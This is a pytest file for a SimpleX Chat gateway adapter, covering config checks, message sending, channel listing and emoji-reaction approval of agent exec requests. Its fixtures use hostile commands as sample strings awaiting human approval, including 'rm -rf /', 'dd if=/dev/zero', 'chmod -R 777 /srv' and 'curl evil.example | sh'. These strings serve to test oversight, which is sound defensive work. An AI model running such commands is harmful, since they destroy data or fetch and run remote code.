"""Tests for the SimpleX Chat platform-plugin adapter.

Loaded via the ``_plugin_adapter_loader`` helper so this lives under
``plugin_adapter_simplex`` in ``sys.modules`` and cannot collide with
sibling platform-plugin tests on the same xdist worker.
"""

from __future__ import annotations

import asyncio
import json
from unittest.mock import AsyncMock, MagicMock

import pytest

from tests.gateway._plugin_adapter_loader import load_plugin_adapter

_simplex = load_plugin_adapter("simplex")

SimplexAdapter = _simplex.SimplexAdapter
check_requirements = _simplex.check_requirements
validate_config = _simplex.validate_config
is_connected = _simplex.is_connected
register = _simplex.register
_env_enablement = _simplex._env_enablement
_standalone_send = _simplex._standalone_send
_guess_extension = _simplex._guess_extension
_is_image_ext = _simplex._is_image_ext
_is_audio_ext = _simplex._is_audio_ext
_CORR_PREFIX = _simplex._CORR_PREFIX


# ---------------------------------------------------------------------------
# 1. Platform enum (plugin-discovered, not bundled)
# ---------------------------------------------------------------------------

def test_platform_enum_resolves_via_plugin_scan():
    """The plugin filesystem scan should expose Platform("simplex")."""
    from gateway.config import Platform
    p = Platform("simplex")
    assert p.value == "simplex"
    # Identity stability — repeated lookups return the same pseudo-member
    assert Platform("simplex") is p


# ---------------------------------------------------------------------------
# 2. check_requirements / validate_config / is_connected
# ---------------------------------------------------------------------------


def test_check_requirements_true_when_configured(monkeypatch):
    monkeypatch.setenv("SIMPLEX_WS_URL", "ws://127.0.0.1:5225")
    # websockets is a dev dep in this repo via the test plugins; the
    # check_requirements() gate also asserts the package imports.
    websockets_present = True
    try:
        import websockets  # noqa: F401
    except ImportError:
        websockets_present = False
    assert check_requirements() is websockets_present


def test_validate_config_uses_env_or_extra():
    from gateway.config import PlatformConfig
    # Empty extra + no env → invalid
    cfg = PlatformConfig(enabled=True)
    assert validate_config(cfg) is False
    # extra-only path → valid
    cfg2 = PlatformConfig(enabled=True, extra={"ws_url": "ws://localhost:5225"})
    assert validate_config(cfg2) is True


def test_is_connected_mirrors_validate(monkeypatch):
    from gateway.config import PlatformConfig
    monkeypatch.delenv("SIMPLEX_WS_URL", raising=False)
    cfg = PlatformConfig(enabled=True, extra={"ws_url": "ws://x"})
    assert is_connected(cfg) is True
    assert is_connected(PlatformConfig(enabled=True)) is False


# ---------------------------------------------------------------------------
# 3. _env_enablement seeds PlatformConfig.extra
# ---------------------------------------------------------------------------


def test_env_enablement_seeds_home_channel(monkeypatch):
    monkeypatch.setenv("SIMPLEX_WS_URL", "ws://127.0.0.1:5225")
    monkeypatch.setenv("SIMPLEX_HOME_CHANNEL", "42")
    monkeypatch.setenv("SIMPLEX_HOME_CHANNEL_NAME", "Personal")
    seed = _env_enablement()
    assert seed["home_channel"] == {"chat_id": "42", "name": "Personal"}


# ---------------------------------------------------------------------------
# 4. Adapter init
# ---------------------------------------------------------------------------

def test_adapter_init_custom_url():
    from gateway.config import PlatformConfig
    cfg = PlatformConfig(enabled=True, extra={"ws_url": "ws://localhost:5225"})
    adapter = SimplexAdapter(cfg)
    assert adapter.ws_url == "ws://localhost:5225"
    assert adapter._running is False
    assert adapter._ws is None


# ---------------------------------------------------------------------------
# 5. Helper functions (magic-byte detection)
# ---------------------------------------------------------------------------

def test_guess_extension_png():
    assert _guess_extension(b"\x89PNG\r\n\x1a\n") == ".png"


# ---------------------------------------------------------------------------
# 6. Correlation IDs
# ---------------------------------------------------------------------------


def test_corr_id_pending_set_self_trims():
    from gateway.config import PlatformConfig
    cfg = PlatformConfig(enabled=True, extra={"ws_url": "ws://localhost:5225"})
    adapter = SimplexAdapter(cfg)
    adapter._max_pending_corr = 4
    for _ in range(10):
        adapter._make_corr_id()
    # After many additions, the pending set should be bounded by the trim
    # logic — at most one trim window above the cap.
    assert len(adapter._pending_corr_ids) <= adapter._max_pending_corr + 1


# ---------------------------------------------------------------------------
# 7. Outbound send (mocked WS)
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_send_group():
    """Groups use the structured ``/_send #<id> json [...]`` form.

    The bracket chat-command form ``#[<id>] text`` *looks* like an exact
    ID match in the daemon docs but is parsed as a display-name lookup
    — so messages to groups whose display name isn't literally the ID
    silently drop. The structured ``/_send`` form addresses by numeric
    ID and survives newlines/quoting through ``json.dumps``.
    """
    from gateway.config import PlatformConfig
    cfg = PlatformConfig(enabled=True, extra={"ws_url": "ws://localhost:5225"})
    adapter = SimplexAdapter(cfg)

    mock_ws = AsyncMock()
    adapter._ws = mock_ws

    result = await adapter.send("group:grp-99", "Hello, group!")
    payload = json.loads(mock_ws.send.call_args[0][0])
    assert payload["cmd"].startswith("/_send #grp-99 json ")
    msg_content = json.loads(payload["cmd"].split(" json ", 1)[1])[0][
        "msgContent"
    ]
    assert msg_content == {"type": "text", "text": "Hello, group!"}
    assert result.success is True


# ---------------------------------------------------------------------------
# 7b. Channel directory enumeration (list_channels)
# ---------------------------------------------------------------------------


def _adapter_with_ws():
    from gateway.config import PlatformConfig
    cfg = PlatformConfig(enabled=True, extra={"ws_url": "ws://localhost:5225"})
    adapter = SimplexAdapter(cfg)
    adapter._ws = AsyncMock()
    return adapter


@pytest.mark.asyncio
async def test_list_channels_contacts_and_groups():
    adapter = _adapter_with_ws()

    async def fake_send_command(command, timeout=30.0):
        if command == "/contacts":
            return {
                "contacts": [
                    {"contactId": 1, "localDisplayName": "alice"},
                    {"contactId": 2, "profile": {"displayName": "bob"}},
                    "garbage",
                ]
            }
        if command == "/groups":
            return {
                "groups": [
                    {"groupId": 7, "localDisplayName": "friends"},
                    # [groupInfo, groupSummary] pair form
                    [{"groupId": 9, "groupProfile": {"displayName": "work"}}, {}],
                ]
            }
        return None

    adapter._send_command = fake_send_command
    channels = await adapter.list_channels()

    assert {"id": "alice", "name": "alice", "type": "dm"} in channels
    assert {"id": "bob", "name": "bob", "type": "dm"} in channels
    assert {"id": "group:7", "name": "friends", "type": "group"} in channels
    assert {"id": "group:9", "name": "work", "type": "group"} in channels


@pytest.mark.asyncio
async def test_list_channels_returns_none_when_disconnected():
    """None (not []) so the directory falls back to session discovery."""
    from gateway.config import PlatformConfig
    cfg = PlatformConfig(enabled=True, extra={"ws_url": "ws://localhost:5225"})
    adapter = SimplexAdapter(cfg)
    assert adapter._ws is None
    assert await adapter.list_channels() is None


@pytest.mark.asyncio
async def test_list_channels_returns_none_on_contacts_timeout():
    adapter = _adapter_with_ws()

    async def fake_send_command(command, timeout=30.0):
        return None  # daemon unresponsive

    adapter._send_command = fake_send_command
    assert await adapter.list_channels() is None


# ---------------------------------------------------------------------------
# 8. Inbound: filter own-echo by corrId prefix
# ---------------------------------------------------------------------------


# ---------------------------------------------------------------------------
# 9. Standalone (out-of-process) send for cron
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_standalone_send_missing_websockets(monkeypatch):
    """When websockets is unimportable, return a clean error dict.

    Implementation detail: the standalone path does ``import websockets``
    inside the function body. We simulate the package being absent by
    pulling it out of ``sys.modules`` and pointing the finder at None.
    """
    import sys
    saved_websockets = sys.modules.pop("websockets", None)
    saved_meta = list(sys.meta_path)

    class _Blocker:
        @staticmethod
        def find_spec(name, path=None, target=None):
            if name == "websockets" or name.startswith("websockets."):
                raise ImportError("websockets blocked for test")
            return None

    sys.meta_path.insert(0, _Blocker())
    try:
        pconfig = MagicMock()
        pconfig.extra = {"ws_url": "ws://localhost:5225"}
        result = await _standalone_send(pconfig, "contact-42", "hi")
        assert isinstance(result, dict)
        assert "error" in result
        assert "websockets" in result["error"]
    finally:
        sys.meta_path[:] = saved_meta
        if saved_websockets is not None:
            sys.modules["websockets"] = saved_websockets


# ---------------------------------------------------------------------------
# 10. register() — plugin-side metadata
# ---------------------------------------------------------------------------


# ---------------------------------------------------------------------------
# Inbound attachment message type classification
# ---------------------------------------------------------------------------

def _make_file_chat_item(file_path: str, file_name: str) -> dict:
    """Minimal direct-chat rcvMsgContent item carrying a completed file."""
    return {
        "chatInfo": {
            "type": "direct",
            "contact": {"contactId": 42, "localDisplayName": "tester"},
        },
        "chatItem": {
            "chatDir": {"type": "directRcv"},
            "meta": {"itemTs": "2026-01-01T00:00:00Z"},
            "content": {
                "type": "rcvMsgContent",
                "msgContent": {"type": "file", "text": "here you go"},
            },
            "file": {
                "fileId": 7,
                "fileName": file_name,
                "fileSource": {"filePath": file_path},
            },
        },
    }


# ---------------------------------------------------------------------------
# 11. Reaction-based exec approvals
# ---------------------------------------------------------------------------

def _choice_table():
    """The adapter's (emoji, choice, label) table, resolved at call time."""
    return _simplex._APPROVAL_CHOICES


def _approval_adapter(reaction_response=None, item_id=501):
    """Adapter plus a fake daemon that records every command it is sent.

    ``/_send`` answers with a ``newChatItems`` reply carrying *item_id* so
    the approval prompt has an anchor; ``/_reaction`` answers with
    *reaction_response* (default: accepted).
    """
    adapter = _adapter_with_ws()
    sent = []

    async def fake_send_command(command, timeout=30.0):
        sent.append(command)
        if command.startswith("/_send "):
            return {
                "type": "newChatItems",
                "chatItems": [
                    {
                        "chatInfo": {"type": "direct"},
                        "chatItem": {"meta": {"itemId": item_id}},
                    }
                ],
            }
        if command.startswith("/_reaction "):
            if reaction_response is not None:
                return reaction_response
            return {"type": "chatItemReaction", "added": True}
        return None

    adapter._send_command = fake_send_command
    return adapter, sent


async def _drain(adapter):
    """Await the adapter's detached reaction seed/cleanup tasks."""
    for _ in range(10):
        pending = [t for t in adapter._background_tasks if not t.done()]
        if not pending:
            return
        await asyncio.gather(*pending, return_exceptions=True)


def _prompt_text(sent):
    """Pull the prompt body back out of the recorded ``/_send`` command."""
    send_cmds = [c for c in sent if c.startswith("/_send ")]
    assert send_cmds, "no /_send command was recorded"
    composed = json.loads(send_cmds[-1].split(" json ", 1)[1])
    return composed[0]["msgContent"]["text"]


def _reaction_commands(sent, toggle="on"):
    return [
        c for c in sent
        if c.startswith("/_reaction ") and f" {toggle} " in c
    ]


def _reaction_emoji(command):
    return json.loads(command.split(" on ", 1)[1].split(" off ", 1)[-1])["emoji"]


def _reaction_event(
    emoji,
    *,
    item_id=501,
    added=True,
    dir_type="directRcv",
    contact_id=42,
    member=None,
):
    """A daemon ``chatItemReaction`` event in the documented ACIReaction shape."""
    chat_dir = {"type": dir_type}
    if member is not None:
        chat_dir["groupMember"] = member
    return {
        "resp": {
            "type": "chatItemReaction",
            "added": added,
            "reaction": {
                "chatInfo": {
                    "type": "direct",
                    "contact": {
                        "contactId": contact_id,
                        "localDisplayName": "tester",
                    },
                },
                "chatReaction": {
                    "chatDir": chat_dir,
                    "chatItem": {"meta": {"itemId": item_id}},
                    "sentAt": "2026-01-01T00:00:00Z",
                    "reaction": {"type": "emoji", "emoji": emoji},
                },
            },
        }
    }


@pytest.fixture
def resolved_approvals(monkeypatch):
    """Capture calls into ``tools.approval.resolve_gateway_approval``.

    The adapter imports it lazily inside the handler, so patching the module
    attribute is what the real call site sees.
    """
    import tools.approval as approval_mod

    calls = []
    state = {"count": 1}

    def fake_resolve(session_key, choice, *args, **kwargs):
        calls.append((session_key, choice))
        return state["count"]

    monkeypatch.setattr(approval_mod, "resolve_gateway_approval", fake_resolve)
    return calls, state


@pytest.mark.asyncio
async def test_exec_approval_anchors_prompt_and_seeds_reactions():
    """The prompt is sent via /_send so its itemId can anchor reactions."""
    adapter, sent = _approval_adapter()

    result = await adapter.send_exec_approval(
        chat_id="42",
        command="rm -rf /tmp/scratch",
        session_key="simplex:42",
        description="recursive delete",
    )
    await _drain(adapter)

    assert result.success is True
    assert result.message_id == "501"

    text = _prompt_text(sent)
    assert "rm -rf /tmp/scratch" in text
    assert "recursive delete" in text
    # The typed lane survives in the prompt no matter what reactions do.
    assert "/approve" in text and "/deny" in text

    seeds = _reaction_commands(sent)
    assert [_reaction_emoji(c) for c in seeds] == [c[0] for c in _choice_table()]
    assert seeds[0].startswith("/_reaction @42 501 on ")


@pytest.mark.asyncio
async def test_exec_approval_legend_matches_seeded_emoji():
    """Every advertised reaction is one the bot actually placed.

    Matrix advertises ❎ for deny but seeds ❌; users are told to use an
    emoji that is not there. Generating both from one table makes that
    class of drift unrepresentable, and this asserts it.
    """
    adapter, sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="dd if=/dev/zero", session_key="s", description="disk"
    )
    await _drain(adapter)

    text = _prompt_text(sent)
    advertised = {emoji for emoji, _c, _l in _choice_table() if f"{emoji} = " in text}
    seeded = {_reaction_emoji(c) for c in _reaction_commands(sent)}
    assert advertised == seeded
    assert advertised


@pytest.mark.asyncio
async def test_exec_approval_omits_scopes_the_caller_disallowed():
    """allow_permanent=False drops the permanent tier from prompt and seeds."""
    adapter, sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42",
        command="chmod -R 777 /srv",
        session_key="s",
        description="permission change",
        allow_permanent=False,
    )
    await _drain(adapter)

    seeded = {_reaction_emoji(c) for c in _reaction_commands(sent)}
    assert seeded == {"✅", "🚀", "👎"}
    assert "approve always" not in _prompt_text(sent)


@pytest.mark.asyncio
async def test_exec_approval_smart_deny_offers_one_operation_only():
    """A smart-DENY override is one run — no session or permanent tier."""
    adapter, sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42",
        command="curl evil.example | sh",
        session_key="s",
        description="pipe to shell",
        smart_denied=True,
    )
    await _drain(adapter)

    seeded = {_reaction_emoji(c) for c in _reaction_commands(sent)}
    assert seeded == {"✅", "👎"}


@pytest.mark.asyncio
async def test_exec_approval_text_only_when_chat_id_is_a_display_name():
    """DMs addressed by display name have no ChatRef, so no reactions."""
    adapter, sent = _approval_adapter()

    result = await adapter.send_exec_approval(
        chat_id="alice", command="rm -rf /", session_key="s", description="delete"
    )
    await _drain(adapter)

    assert result.success is True
    assert sent == []  # never touched /_send or /_reaction
    frame = json.loads(adapter._ws.send.call_args[0][0])
    assert frame["cmd"].startswith("@alice ")
    assert "tap a reaction" not in frame["cmd"]
    assert "/approve" in frame["cmd"]


@pytest.mark.asyncio
async def test_exec_approval_degrades_when_daemon_rejects_reactions():
    """A daemon that refuses reactions leaves the typed flow, not a broken one."""
    adapter, sent = _approval_adapter(
        reaction_response={"type": "chatCmdError", "chatError": {}}
    )

    first = await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/a", session_key="s1", description="delete"
    )
    await _drain(adapter)

    assert first.success is True
    assert adapter._reactions_supported is False
    # Exactly one attempt, then it stops trying.
    assert len(_reaction_commands(sent)) == 1
    notice = json.loads(adapter._ws.send.call_args[0][0])["cmd"]
    assert "/approve" in notice

    sent.clear()
    adapter._ws.send.reset_mock()
    second = await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/b", session_key="s2", description="delete"
    )
    await _drain(adapter)

    assert second.success is True
    # No anchoring send, no reaction attempts — just the plain text prompt.
    assert sent == []
    second_prompt = json.loads(adapter._ws.send.call_args[0][0])["cmd"]
    assert "tap a reaction" not in second_prompt
    assert "/approve" in second_prompt


@pytest.mark.asyncio
async def test_exec_approval_reports_failure_when_daemon_rejects_the_send():
    """A rejected prompt send must fail so run.py falls back to plain text."""
    adapter = _adapter_with_ws()

    async def fake_send_command(command, timeout=30.0):
        return {"type": "chatCmdError", "chatError": {}}

    adapter._send_command = fake_send_command
    result = await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /", session_key="s", description="delete"
    )
    assert result.success is False


@pytest.mark.asyncio
async def test_reaction_resolves_pending_approval(resolved_approvals):
    calls, _state = resolved_approvals
    adapter, sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="simplex:42",
        description="delete",
    )
    await _drain(adapter)

    await adapter._handle_event(_reaction_event("✅"))
    await _drain(adapter)

    assert calls == [("simplex:42", "once")]
    # State is retired and the bot's own seeds are toggled back off.
    assert adapter._approval_prompts_by_item == {}
    assert adapter._approval_prompt_by_session == {}
    assert len(_reaction_commands(sent, toggle="off")) == len(_choice_table())


@pytest.mark.asyncio
async def test_reaction_variation_selector_is_normalized(resolved_approvals):
    """❤ arrives with and without U+FE0F depending on the client."""
    calls, _state = resolved_approvals
    adapter, _sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)

    await adapter._handle_event(_reaction_event("❤️"))
    assert calls == [("s", "always")]


@pytest.mark.asyncio
async def test_thumbs_up_is_accepted_as_approve_once(resolved_approvals):
    calls, _state = resolved_approvals
    adapter, _sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)

    await adapter._handle_event(_reaction_event("👍"))
    assert calls == [("s", "once")]


@pytest.mark.asyncio
async def test_own_seed_echo_does_not_resolve(resolved_approvals):
    calls, _state = resolved_approvals
    adapter, _sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)

    await adapter._handle_event(_reaction_event("✅", dir_type="directSnd"))
    assert calls == []


@pytest.mark.asyncio
async def test_removing_a_reaction_does_not_resolve(resolved_approvals):
    calls, _state = resolved_approvals
    adapter, _sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)

    await adapter._handle_event(_reaction_event("✅", added=False))
    assert calls == []


@pytest.mark.asyncio
async def test_reaction_from_another_contact_is_ignored(resolved_approvals):
    """Fail closed: only the contact whose DM raised the approval may answer."""
    calls, _state = resolved_approvals
    adapter, _sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)

    await adapter._handle_event(_reaction_event("✅", contact_id=99))
    assert calls == []
    assert adapter._approval_prompts_by_item  # still pending


@pytest.mark.asyncio
async def test_group_reaction_requires_the_allowlist(monkeypatch, resolved_approvals):
    calls, _state = resolved_approvals
    monkeypatch.setenv("SIMPLEX_GROUP_ALLOWED", "7")
    monkeypatch.setenv("SIMPLEX_ALLOWED_USERS", "member-a")
    adapter, sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="group:7", command="rm -rf /tmp/x", session_key="s",
        description="delete",
    )
    await _drain(adapter)
    assert _reaction_commands(sent)[0].startswith("/_reaction #7 501 on ")

    outsider = _reaction_event(
        "✅", dir_type="groupRcv",
        member={"memberId": "member-b", "localDisplayName": "mallory"},
    )
    await adapter._handle_event(outsider)
    assert calls == []

    insider = _reaction_event(
        "✅", dir_type="groupRcv",
        member={"memberId": "member-a", "localDisplayName": "alice"},
    )
    await adapter._handle_event(insider)
    await _drain(adapter)
    assert calls == [("s", "once")]


@pytest.mark.asyncio
async def test_unmapped_reaction_explains_itself_once(resolved_approvals):
    calls, _state = resolved_approvals
    adapter, _sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)
    adapter._ws.send.reset_mock()

    await adapter._handle_event(_reaction_event("😂"))
    await adapter._handle_event(_reaction_event("😢"))

    assert calls == []
    # One explanatory reply, not one per stray reaction.
    assert adapter._ws.send.call_count == 1


@pytest.mark.asyncio
async def test_stale_tap_is_told_the_command_did_not_run(resolved_approvals):
    """resolve returning 0 means the queue was already drained (#63501)."""
    calls, state = resolved_approvals
    state["count"] = 0
    adapter, _sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)
    adapter._ws.send.reset_mock()

    await adapter._handle_event(_reaction_event("✅"))
    await _drain(adapter)

    assert calls == [("s", "once")]
    reply = json.loads(adapter._ws.send.call_args[0][0])["cmd"]
    assert "no longer pending" in reply
    assert "Approved" not in reply


@pytest.mark.asyncio
async def test_expired_prompt_is_retired_without_resolving(resolved_approvals):
    calls, _state = resolved_approvals
    adapter, _sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)
    adapter._approval_prompts_by_item["501"].expires_at = 0.0
    adapter._ws.send.reset_mock()

    await adapter._handle_event(_reaction_event("✅"))
    await _drain(adapter)

    assert calls == []
    assert adapter._approval_prompts_by_item == {}
    assert "expired" in json.loads(adapter._ws.send.call_args[0][0])["cmd"]


@pytest.mark.asyncio
async def test_new_prompt_for_a_session_evicts_the_previous_one():
    """Single-flight per session, same as the Matrix adapter."""
    adapter, _sent = _approval_adapter(item_id=501)
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/a", session_key="s", description="delete"
    )
    await _drain(adapter)

    adapter2, _s2 = _approval_adapter(item_id=777)
    adapter._send_command = adapter2._send_command
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/b", session_key="s", description="delete"
    )
    await _drain(adapter)

    assert list(adapter._approval_prompts_by_item) == ["777"]
    assert adapter._approval_prompt_by_session == {"s": "777"}
